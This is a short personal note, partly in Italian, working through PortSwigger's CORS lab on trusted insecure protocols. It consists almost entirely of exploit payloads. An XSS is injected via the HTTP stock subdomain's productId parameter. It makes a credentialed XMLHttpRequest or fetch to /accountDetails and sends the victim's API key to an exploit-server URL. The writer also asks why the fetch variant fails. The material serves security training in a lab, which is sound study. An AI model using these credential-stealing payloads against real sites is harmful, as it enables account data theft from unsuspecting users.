
https://portswigger.net/web-security/cors/lab-breaking-https-attack



questo funziona ma l'altro perch√® no????
<script>
    document.location="http://stock.0a61002e04c2430f80f926d80099008a.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/log?key='%2b JSON.parse(this.responseText).apikey;};%3c/script>&storeId=1"
</script>

sarebbe:
<script>
    var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails',true); 
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/log?key=' + JSON.parse(this.responseText).apikey;
    };

</script>



PERCHE NON FUNZIONI MALEDETTO
<script>
    fetch("http://stock.0a61002e04c2430f80f926d80099008a.web-security-academy.net/?productId=4<script>fetch('https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails', {credentials: 'include',}).then(response => {return response.json();}).then(data => {fetch('https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/?apikey='%2b data)});%3c/script>&storeId=1");
</script>


sarebbe:
<script>
    fetch('https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails', {
        credentials: 'include',
    })
    .then(response => {return response.json();})
    .then(data => {fetch('https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/?apikey='+data)});
    
</script>